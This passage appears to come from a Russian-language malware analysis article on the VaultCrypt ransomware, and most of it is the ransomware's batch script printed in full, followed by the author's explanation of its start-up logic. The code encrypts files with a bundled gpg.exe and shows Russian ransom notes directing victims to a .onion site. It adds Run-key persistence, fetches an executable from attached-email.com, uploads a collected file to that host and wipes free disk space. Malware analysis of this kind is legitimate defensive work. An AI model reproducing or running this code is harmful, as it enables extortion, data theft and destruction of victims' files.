+echo 25EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 28EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 29EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo.&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+echo XCONF: !58d179b8!&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+del /f /q "!loco!.js"
+"%temp%\gpg.exe" --import "%temp%\03dfb98e.7087b06e"
+del /f /q "%temp%\03dfb98e.7087b06e"
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always -o "%temp%\VAULT.KEY" -e "%temp%\3637bf69.36ddf8fe"
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always -o "%temp%\CONFIRMATION.KEY" -e "%temp%\8f9c3dbb.9767d548"
+if not exist "%temp%\VAULT.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\3637bf69.36ddf8fe"
+RENAME "%temp%\3637bf69.36ddf8fe.gpg" VAULT.KEY
+)
+if not exist "%temp%\CONFIRMATION.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\8f9c3dbb.9767d548"
+RENAME "%temp%\8f9c3dbb.9767d548.gpg" CONFIRMATION.KEY
+)
+if not exist "%temp%\VAULT.KEY" (
+del /f /q "%temp%\*.vlt"
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\*.lock"
+del /f /q "%temp%\*.bak"
+del /f /q "%temp%\*.list"
+goto 6d0f24b8
+)
+echo.&gt;&gt; "%temp%\VAULT.KEY"
+echo 01FNSH-!715c7be3!&gt;&gt; "%temp%\VAULT.KEY"
+echo 02FNSH-!b67b5d00!&gt;&gt; "%temp%\VAULT.KEY"
+echo 03FNSH-!db5a2d8a!&gt;&gt; "%temp%\VAULT.KEY"
+echo 04FNSH-!dc841a88!&gt;&gt; "%temp%\VAULT.KEY"
+echo 05FNSH-!ee1f189d!&gt;&gt; "%temp%\VAULT.KEY"
+echo FHASH-!2162ea2b!&gt;&gt; "%temp%\VAULT.KEY"
+
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt; "%temp%\secring.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\secring.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\secring.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+move /y "%temp%\secring.qpq" "%temp%\secring.gpg"
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+move /y "%temp%\36ddf8fe3637bf69.qpq" "%temp%\3637bf69.36ddf8fe"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+move /y "%temp%\9767d5488f9c3dbb.qpq" "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\secring.gpg"
+del /f /q "%temp%\3637bf69.36ddf8fe"
+del /f /q "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\trustdb.gpg"
+del /f /q "%temp%\secring.gpg"
+del /f /q "%temp%\*.lock"
+del /f /q "%temp%\*.bak"
+attrib -s -h -r "%AppData%\gnupg\*.*"
+attrib -s -h -r "%AppData%\gnupg"
+del /f /q "%AppData%\gnupg\*.*"
+rmdir /s /q "%AppData%\gnupg"
+copy /y "%temp%\CONFIRMATION.KEY" "%appdata%\CONFIRMATION.KEY"
+copy /y "%temp%\VAULT.KEY" "%appdata%\VAULT.KEY"
+copy /y "%temp%\VAULT.KEY" "%temp%\4077430c_VAULT.KEY"
+echo 01FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 02FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 03FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 04FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 05FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo FHASH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+attrib +r "%temp%\4077430c_VAULT.KEY"
+copy /y "%temp%\VAULT.KEY" "%userprofile%\Desktop\VAULT.KEY"
+echo.&gt; "%temp%\VAULT.txt"
+echo Ваши рабочие документы и базы данных были заблокированы и помечены форматом .vаult &gt;&gt; "%temp%\VAULT.txt"
+
+echo Для их восстановления необходимо получить уникальный ключ&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo   ПРОЦЕДУРА ПОЛУЧЕНИЯ КЛЮЧА: &gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo КРАТКО&gt;&gt; "%temp%\VAULT.txt"
+echo 1. Перейдите на наш веб-ресурс&gt;&gt; "%temp%\VAULT.txt"
+echo 2. Гарантированно получите Ваш ключ&gt;&gt; "%temp%\VAULT.txt"
+echo 3. Восстановите файлы в прежний вид&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ДЕТАЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 1:&gt;&gt; "%temp%\VAULT.txt"
+echo Скачайте Tor браузер с официального сайта: http://torproject.org&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 2:&gt;&gt; "%temp%\VAULT.txt"
+echo Используя Tor браузер посетите сайт: http://restoredz4xpmuqr.onion&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 3:&gt;&gt; "%temp%\VAULT.txt"
+echo Найдите Ваш уникальный VAULT.KEY на компьютере - это Ваш ключ к личной клиент-панели. Не удалите его&gt;&gt; "%temp%\VAULT.txt"
+echo Авторизируйтесь на сайте используя ключ VAULT.KEY&gt;&gt; "%temp%\VAULT.txt"
+echo Перейдите в раздел FAQ и ознакомьтесь с дальнейшей процедурой&gt;&gt; "%temp%\VAULT.txt"
+echo   STEP 4:&gt;&gt; "%temp%\VAULT.txt"
+echo После получения ключа, Вы можете восстановить файлы используя наше ПО с открытым исходным кодом или же безопасно использовать своё ПО&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ДОПОЛНИТЕЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo a^) Вы не сможете восстановить файлы без уникального ключа ^(который безопасно хранится на нашем сервере^)&gt;&gt; "%temp%\VAULT.txt"
+echo b^) Если Вы не можете найти Ваш VAULT.KEY, поищите во временной папке TEMP &gt;&gt; "%temp%\VAULT.txt"
+echo c^) Ваша стоимость восстановления не окончательная, пишите в чат&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo   Дата блокировки: %date% ^(%time:~0,5%^)&gt;&gt; "%temp%\VAULT.txt"
+copy /y "%temp%\VAULT.txt" "%userprofile%\Desktop\vault.txt"
+attrib +h "%userprofile%\Desktop\vault.txt"
+
+echo var cdp="%%TeMp%%\\4c2e533d.cmd";var WshShell=CreateObject("WScript.Shell");cdp=WshShell.ExpandEnvironmentStrings(cdp);function CreateObject(fq){return new ActiveXObject(fq)}function xx(cdp){WshShell.Run(cdp,0,0);}xx(''+cdp+'');&gt;&gt; "%temp%\e33176c1.js"
+"%TEMP%\gpg.exe" --import "%TEMP%\pubring.gpg"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /t REG_SZ /f /d "notepad %temp%\VAULT.txt"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /t REG_SZ /f /d "attrib -h %userprofile%\Desktop\vault.txt"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /t REG_SZ /f /d "wscript //B //Nologo %temp%\e33176c1.js"
+call "%temp%\4c2e533d.cmd"
+echo ^&lt;html^&gt;^&lt;head^&gt;^&lt;hta:application BORDER = "none" CAPTION = "No" CONTEXTMENU = "Yes" INNERBORDER = "No" MAXIMIZEBUTTON = "No" MINIMIZEBUTTON = "No" NAVIGABLE = "No" SCROLL = "No" SCROLLFLAT = "No" SELECTION = "Yes" SHOWINTASKBAR = "No" SINGLEINSTANCE = "Yes" SYSMENU = "No"/^&gt;^&lt;style^&gt;body{cursor:default;background-color:#E7E7E7;margin:0;font-family:"HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;text-align:center;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAgMAAADUJKRdAAAACVBMVEXs7Ozv7+/6+vqH/Ct2AAAAW0lEQVQI11WOsQ2DABADv8gAGQFd4SJTZARGQC5cMBX1T0mD4ClP9lmutf71qW/t3d19VBLDcrNR7KV+F4Mx28OKyMzf/UDINvYADR9A08cwfcnjDwmarOBn7wSqEUpFZuJdBQAAAABJRU5ErkJggg==)}.vaustyle{margin:10px;height:520px;width:1100px}.sc{margin:10px 150px;font-size:40px;width:900px;padding:20px;background-color:#7a7a7a;color:#FF4C4C;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}.briefly{position:absolute;left:50px;width:480px}.detailed{display:inline-block;margin-left:530px;width:660px}.bti{background-color:#DFDFDF;color:#555;font-size:28px;padding:10px}hr{width:90%%}.sced{margin-top:15px;text-align:center;font-size:27px;height:220px;padding:20px;background-color:#6a6a6a;line-height:1.5;color:#EAEAEA;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}form{display:inline}.dbutt{margin-left:2px;font-size:16px;font-weight:500;border:none;background-color:#9f9f9f;color:#EEE;cursor:pointer}.footer{text-align:left;position:relative;width:600px;margin:2px 2px 2px 45px;height:16px;font-size:15px;background-color:#CFCFCF;color:#444;padding:6px}.fnl{font-size:21px}^&lt;/style^&gt;^&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/^&gt;^&lt;title^&gt;Vault Notification^&lt;/title^&gt;^&lt;script language="vbscript"^&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+
+echo sub Window_Onload&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.resizeTo 1280,725&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo screenWidth = Document.ParentWindow.Screen.AvailWidth&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo screenHeight = Document.ParentWindow.Screen.AvailHeight&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo posLeft = (screenWidth - 1280) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo posTop = (screenHeight - 725) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.moveTo posLeft, posTop &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo end sub &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo ^&lt;/script^&gt;^&lt;/head^&gt;^&lt;body scroll="no"^&gt;^&lt;div class="vaustyle"^&gt;^&lt;div class="sc"^&gt;Ваши документы и базы данных были зашифрованы и помещены в^&lt;br^&gt;^☢^ ^&lt;b^&gt;формат .VAULT^&lt;/b^&gt;^ ^☢^&lt;/div^&gt;^&lt;div class="sc" style="font-size:20px;width:800px;margin-left:200px;color:#EAEAEA;"^&gt;Для их восстановления необходимо получить ^&lt;b^&gt;Ваш ключ^&lt;/b^&gt;^&lt;/div^&gt;^&lt;br^&gt;^&lt;div class="briefly"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Кратко:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Необходимо произвести 3 шага:^&lt;hr^&gt; ^➠ Перейдите на наш веб-ресурс^&lt;br^&gt; ^Ⓑ Получите свой ключ^&lt;br^&gt;^⤷ ^&lt;b^&gt;Восстановите файлы^&lt;/b^&gt;^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="detailed"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Детально:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Скачайте ^&lt;b^&gt;Tor^&lt;/b^&gt; браузер с оф. сайта ^&lt;form action="http://dist.torproject.org/torbrowser/4.5.2/torbrowser-install-4.5.2_ru.exe"^&gt;^&lt;input class="dbutt" type="submit" value="⇣ Загрузить"^&gt;^&lt;/form^&gt;^&lt;form action="https://www.torproject.org/projects/torbrowser.html.en#windows"^&gt;^&lt;input class="dbutt" type="submit" value="Help" style="padding-bottom:1px;"^&gt;^&lt;/form^&gt;^&lt;hr^&gt;Перейдите на наш сайт ^&lt;b^&gt;используя Tor^&lt;/b^&gt;:^&lt;br^&gt;^&lt;div class="bti" style="margin:1px 8%%;padding:0px;cursor:text;"^&gt;http://restoredz4xpmuqr.onion^&lt;/div^&gt;^&lt;form action="http://pastebin.com/rs7jZ0TW"^&gt;^&lt;input class="dbutt" type="submit" value="Не работает?"^&gt;^ ^⤴^&lt;/form^&gt;^&lt;hr^&gt;^&lt;div class="fnl"^&gt;Авторизируйтесь ^ ^➤^  ^&lt;b^&gt;Прочитайте отзывы^&lt;/b^&gt; ^ ^➤^  Ключ^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 1:^&lt;/b^&gt; Вы не сможете восстановить файлы без уникального ключа.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 2:^&lt;/b^&gt; Перед авторизацией, Вы ^&lt;u^&gt;должны^&lt;/u^&gt; найти Ваш ^&lt;b^&gt;VAULT.KEY^&lt;/b^&gt; на компьютере.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 3: Стоимость полного восстановления на ресурсе не окончательная^&lt;/div^&gt;^&lt;/div^&gt;^&lt;/body^&gt;^&lt;/html^&gt;&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+copy /y "%temp%\ddae25beb5b57d6e.hta" "%appdata%\ddae25beb5b57d6e.hta"
+del /f /q "%temp%\4c2e533d.cmd"
+attrib +h "%appdata%\ddae25beb5b57d6e.hta"
+attrib +r +s "%temp%\VAULT.KEY"
+attrib +r +s "%appdata%\VAULT.KEY"
+attrib +r +s "%userprofile%\Desktop\VAULT.KEY"
+:6d0f24b8
+echo do_vbsUpload &gt; "%temp%\77406a1e.vbs"
+echo Sub do_vbsUpload^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileName,DestURL,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo FieldName="FileField" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim aCounter,Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo For Each Arg In WScript.Arguments &gt;&gt; "%temp%\77406a1e.vbs"
+echo Select Case aCounter &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 1: FileName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 2: DestURL=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 3: FieldName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Select &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=aCounter+1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo UploadFile DestURL,FileName,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub UploadFile^(DestURL,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const Boundary="---------------------------0123456789012" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileContents,FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo FileContents=GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo IEPostBinaryRequest DestURL,FormData,Boundary &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FormData,Pre,Po &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const ContentType="application/upload" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre="--"+Boundary+vbCrLf+mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=vbCrLf+"--"+Boundary+"--"+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const adLongVarBinary=205 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim RS: Set RS=CreateObject^("ADODB.Recordset"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Fields.Append "b",adLongVarBinary,Len^(Pre^)+LenB^(FileContents^)+Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.AddNew &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim LenData &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(StringToMB^(Pre^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(StringToMB^(Po^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(FileContents^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Update &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=RS^("b"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo BuildFormData=FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function IEPostBinaryRequest^(URL,FormData,Boundary^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim IE: Set IE=CreateObject^("InternetExplorer.Application"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo IE.Navigate URL,,,FormData,_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: multipart/form-data; boundary="+Boundary+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo do While IE.Busy &gt;&gt; "%temp%\77406a1e.vbs"
+echo Wait &gt;&gt; "%temp%\77406a1e.vbs"
+echo Loop &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo IEPostBinaryRequest=IE.Document.body.innerHTML &gt;&gt; "%temp%\77406a1e.vbs"
+echo IE.Quit &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim MPtemplate &gt;&gt; "%temp%\77406a1e.vbs"
+echo MPtemplate="Content-Disposition: form-data; name=""{field}"";"+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo " filename=""{file}"""+vbCrLf+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: {ct}"+vbCrLf+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Out &gt;&gt; "%temp%\77406a1e.vbs"
+echo Out=Replace^(MPtemplate,"{field}",FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Out=Replace^(Out,"{file}",FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo mpFields=Replace^(Out,"{ct}",ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Stream: Set Stream=CreateObject^("ADODB.Stream"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Type=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.LoadFromFile FileName &gt;&gt; "%temp%\77406a1e.vbs"
+echo GetFile=Stream.Read &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function StringToMB^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim I,B &gt;&gt; "%temp%\77406a1e.vbs"
+echo For I=1 To Len^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo B=B ^&amp; ChrB^(Asc^(Mid^(S,I,1^)^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo StringToMB=B &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub Wait^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo var fp="%%temp%%\\",os="attached-email",WshShell=CreateObject^("WScript.Shell"^),fp=WshShell.ExpandEnvironmentStrings^(fp^);function CreateObject^(b^){return new ActiveXObject^(b^)}function dw^(b,d^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^);new ActiveXObject^("Scripting.FileSystemObject"^);var a=new ActiveXObject^("ADODB.Stream"^);a.Open^(^);a.Type=1;a.Write^(c.ResponseBody^);a.Position=0;a.SaveToFile^(d,2^);a.Close^(^)}dw^("http://"+os+".com/v.vlt",""+fp+"30cb056a.exe"^); &gt; "%temp%\885873e9.js"
+wscript.exe //B //Nologo //T:120 "%temp%\885873e9.js"
+if exist 30cb056a.exe (
+"%temp%\30cb056a.exe" -f "%temp%\91c09c60.25ca7a7c"
+wscript.exe //B //Nologo //T:120 "%temp%\77406a1e.vbs" "%temp%\91c09c60.25ca7a7c" http://attached-email.com/v.php pf
+del /f /q 30cb056a.exe
+)
+del /f /q "%temp%\885873e9.js"
+del /f /q "%temp%\77406a1e.vbs"
+del /f /q "%temp%\91c09c60.25ca7a7c"
+attrib -h -s "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\*.*xe"
+echo Y|assoc .vault=d21f132a
+echo Y|ftype "d21f132a"=mshta.exe vbscript:Execute^(^"msgbox ^"^" BLOCK:^"^"^&amp;vbNewLine^&amp;^"^" %%1^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;ChrW^(10139^)^&amp;^"^" KEY PURCHASE: http://restoredz4xpmuqr.onion^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;^"^" [accessible only via Tor Browser: http://torproject.org]^"^",16,^"^"VaultCrypt [Need to purchase key]^"^":close^"^)
+echo Y|assoc "d21f132a"\DefaultIcon=%SystemRoot%\System32\shell32.dll,-48
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "b320494e" /t REG_SZ /f /d "mshta %appdata%\ddae25beb5b57d6e.hta"
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /f
+del /f /q "%temp%\e33176c1.js"
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /f
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /f
+start mshta "%temp%\ddae25beb5b57d6e.hta"
+attrib -s -h "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+if exist "%systemroot%\system32\cipher.exe" (
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :461cd8b8 %%s
+goto 3c5d9ac8
+:461cd8b8
+cipher /w:%1:
+goto:eof
+:3c5d9ac8
+)
+del /f /q %0
+:871c371d
+
+Бегло просмотрев код, можно увидеть знаковое сообщение:Ваши рабочие документы и базы данных были заблокированы и помечены форматом .vаult
+На этом этапе уже относительно ясно, с чем мы имеем дело. Давайте разберем этот bat-файл чуть подробнее. Задача не сказать чтобы сложная — скорее, долгая.4 Анализ исполняемого файла4.1 Инициализация
+В начале скрипта задается опция EnableDelayedExpansion. Она обеспечивает несколько вещей — в частности, присвоение переменным значений на этапе выполнения, а не разбора кода. Подробнее можно почитать, например, тут (англ.).SetLocal EnableDelayedExpansion
+
+Далее скрипт проверяет, нет ли в папке Temp файла с именем 9480bf43.76a94786. Этот файл — индикатор того, что в данный момент на ПК уже запущен экземпляр вредоносного скрипта.
+Если файл обнаружен — скрипт завершает свою работу, если нет — создает такой файл, записывает туда маркер 871c371d и устанавливает для файла свойства «скрытый» и «системный», а затем продолжает свое выполнение.cd "%TEMP%"
+if not exist "%temp%\9480bf43.76a94786" (
+echo 871c371d &gt; "%temp%\9480bf43.76a94786"
+attrib +s +h "%temp%\9480bf43.76a94786"
+) else (
+goto 871c371d
+)
+
+После этого скачанный на предыдущем этапе файл design.css переименовывается в gpg.exe, причем двумя способами (возможно, для большей надежности). Скачанный файл design.css удаляется.rename "%temp%\design.css" "gpg.exe"
+copy /y "%temp%\design.css" "%temp%\gpg.exe"
+del /f /q "%temp%\design.css"
+NB:Файл «gpg.exe» при запуске с параметром "--help" выдает вот такой забавный баннер:
+Тем не менее, это не похоже на нормальный исполняемый файл GnuPG: если скачать официальный билд 1.4.18, например, отсюда, то можно заметить, что представленный там исполняемый файл gpg.exe имеет размер около 900 КБ, в то время как файл, поставляемый разработчиками вируса, имеет размер порядка 300 КБ, то есть почти в три раза меньше.
+Что же это за файл — для меня пока остается неясным. Либо есть еще какой-то дистрибутив GnuPG с главным исполняемым файлом меньшего размера, либо вирусописатели просто скачали исходный код GnuPG и модифицировали его под свои нужды. Учитывая тот факт, что сейчас этот файл определяется некоторыми антивирусными сканерами как вредоносный, я склоняюсь ко второму варианту. Было бы интересно услышать мнение читателей.
+Далее скрипт устанавливает CP866 в качестве кодовой страницы консоли (что странно — на русскоязычных ОС Windows кодовая страница вроде бы и так CP866).chcp 866
+
